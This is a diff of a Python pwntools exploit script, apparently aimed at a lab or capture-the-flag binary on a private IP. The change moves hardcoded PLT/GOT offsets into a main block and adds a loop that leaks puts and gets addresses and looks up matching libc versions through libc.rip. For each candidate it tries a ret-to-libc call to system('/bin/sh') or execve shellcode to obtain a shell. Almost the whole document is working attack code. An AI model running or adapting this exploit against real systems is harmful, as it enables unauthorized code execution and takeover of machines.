@@ -1,6 +1,7 @@
 import requests
 import json
 from pwn import *
+import argparse
 
 remoteIp = '192.168.0.155'
 remotePort = 9000
@@ -26,15 +27,6 @@ headers2 = headers1
 findLibcUrl = 'https://libc.rip/api/find'
 libcSearchUrl = "https://libc.rip/api/libc/"
 redirectStdErr = True
-
-buffSize = 132
-
-# Function offsets (these don't change due to PIE being disabled)
-pltPuts = 0x8048340
-pltGets = 0x08048330
-mainAddr = 0x804847b
-gotPuts = 0x80497ac
-gotGets = 0x80497a8
 
 # Check if reverse shell was spawned then handle user input and output for the process
 def handleReverseShell():
@@ -365,3 +357,44 @@ def str2bool(v, argname):
         return False
     else:
         print("\nInvalid boolean value for "+ argname+"\n", file=sys.stderr)
+
+# Only executed if ran directly
+if __name__ == "__main__":
+    buffSize = 132
+    
+    # Function offsets (these don't change due to PIE being disabled)
+    pltPuts = 0x8048340
+    pltGets = 0x08048330
+    mainAddr = 0x804847b
+    gotPuts = 0x80497ac
+    gotGets = 0x80497a8
+    
+    putsAddr = leakViaPuts(conn,port,gotPuts)
+    getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
+    responseJson = findPotentialLibcs(putsAddr,getsAddr)
+
+    percXOff = 0
+    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
+    for item in responseJson:
+        # Get the symbol offsets for the specific libc version
+        putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
+
+        # Find the offset of '%x\x00' in libc to use in format string stack leaks (not needed if using only libc leak)
+        if writeToStack:
+            percXOff = getPercXOff(item)
+
+        if not useShellcode:
+            # Attempt to execute system('/bin/sh')
+            retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
+        else:
+            # Attempt to execute execve(/bin/sh) shellcode
+            retVal = attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16),percXOff)
+
+
+        # Print exit message depending on the return value
+        if retVal == 200:
+            print("End of file recieved.")
+            break
+        else:
+            log.failure(f"Recieved premature EOF")
+            proc.close()
